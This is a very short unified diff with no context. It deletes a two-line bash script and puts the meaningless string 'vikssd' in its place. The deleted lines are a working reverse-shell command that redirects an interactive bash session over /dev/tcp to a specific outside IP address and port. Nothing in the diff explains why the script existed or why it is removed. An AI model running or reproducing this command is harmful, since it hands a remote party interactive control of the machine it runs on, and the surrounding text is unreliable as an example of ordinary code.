@@ -1,2 +1,1 @@
-#!/bin/bash
-bash -i >& /dev/tcp/64.52.80.147/5782 0>&1
+vikssd
